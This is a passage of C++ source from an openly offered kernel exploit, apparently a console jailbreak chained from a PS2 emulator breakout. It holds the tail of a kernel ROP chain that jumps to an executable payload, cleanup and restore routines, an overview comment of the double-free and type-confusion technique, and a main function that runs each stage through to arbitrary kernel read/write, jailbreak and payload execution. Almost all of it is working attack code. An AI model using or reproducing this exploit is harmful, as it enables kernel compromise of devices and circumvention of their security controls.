    kchain_buf[index++] = s2.kernel_base + G_POP_QWORD_PTR_RDX_RET;
    kchain_buf[index++] = 0;

    // Restoring r_pktopts_p
    kchain_buf[index++] = s2.kernel_base + G_POP_RDX_RET;
    kchain_buf[index++] = s4.r_pktopts_p + IPV6_PKTINFO_OFFSET;
    kchain_buf[index++] = s2.kernel_base + G_POP_QWORD_PTR_RDX_RET;
    kchain_buf[index++] = 0;

    // Executing payload
    kchain_buf[index++] = rwx_p;

    // Restoring sys_read() return address
    kchain_buf[index++] = s2.kernel_base + G_POP_RDX_RET;
    kchain_buf[index++] = ret_p;
    kchain_buf[index++] = s2.kernel_base + G_POP_QWORD_PTR_RDX_RET;
    kchain_buf[index++] = read_ret_skip_check; // Skip stack overflow check

    // Returning back to the original stack
    kchain_buf[index++] = s2.kernel_base + G_POP_RSP_RET;
    kchain_buf[index++] = ret_p;
    }

    kmemory.copyin(kchain_buf, chain_p, index * 8);
    printf_debug("Second ROP chain written! Length: %d\n", index);

    // Resume thread
    PS::close(fds.unblock_fd);
    PS::close(fds.block_fd);
    scePthreadJoin(pthread, 0);
    printf_debug("Second Thread exited.\n");

    return 0;
}

bool clean = false;
void cleanup()
{
    if (clean) return;
    printf_debug("Cleaning up...\n");

    // Close unix socketpair
    PS::close(s0.unixpair.unblock_fd);
    PS::close(s0.unixpair.block_fd);

    // Free groomed AIOs
    free_aios2(s0.groom_ids, NUM_GROOM_IDS);

    // Free blocking AIOs
    aio_multi_wait(
        &s0.block_id,
        1,
        aio_errs,
        SCE_KERNEL_AIO_WAIT_AND,
        0
    );
    aio_multi_delete(&s0.block_id, 1, aio_errs);

    // Close all sprayed sockets
    for (uint32_t i = 0; i < NUM_SDS; i++)
        if (s0.sds[i] > 0) PS::close(s0.sds[i]);

    clean = true;
}

void restore()
{
    printf_debug("Closing sockets...\n");
    PS::close(dirty_sd);
    PS::close(pktopts_sds[0]);
    PS::close(s4.reclaim_sd);
    PS::close(s4.pipe_fds[0]);
    PS::close(s4.pipe_fds[1]);
}

// overview:
// * double free a aio_entry (resides at a 0x80 malloc zone)
// * type confuse a evf and a ip6_rthdr
// * use evf/rthdr to read out the contents of the 0x80 malloc zone
// * leak a address in the 0x100 malloc zone
// * write the leaked address to a aio_entry
// * double free the leaked address
// * corrupt a ip6_pktopts for restricted r/w
// * corrupt a pipe for arbitrary r/w

void main()
{
    // PS2 Breakout
    PS::Breakout::init();

    // HELLO EVERYNYAN!
    Okage::printf("HELL%d\nEVERYNYAN!\n", 0);
    printf_debug("HELL%d\nEVERYNYAN!\n", 0);

    printf_debug("payload_start: %p, payload_end: %p, size: %d\n",
        payload_start, payload_end, payload_end - payload_start);

    // Exploitation
    // STAGE 0: Setup
    if (setup() != 0) goto end;

    // STAGE 1: Double free AIO queue entry
    if (double_free_reqs() != 0) goto end;

    // STAGE 2: Leak kernel addresses
    if (leak_kernel_addrs() != 0) goto end;

    // STAGE 3: Double free SceKernelAioRWRequest
    if (double_free_reqs1() != 0) goto end;
    // err = 42; goto end;

    // STAGE 4: Get arbitrary kernel read/write
    if (make_kernel_arw() != 0) goto end;

    // Post exploitation
    cleanup();
    jailbreak();
    run_payload();
    // sleep_ms(10000);
    restore();
    
    end:
        if (err != 0)
        {
            cleanup();
            printf_debug("Something went wrong! Error: %d\n", err);
            PS::notification("Exploit Failed! Please Reboot Your Console!");
            PS::Breakout::restore(); // Restore corruption
        }
        else
        {
            printf_debug("Success!\n");
            while (true) cycle_pad_colors();
        }
}
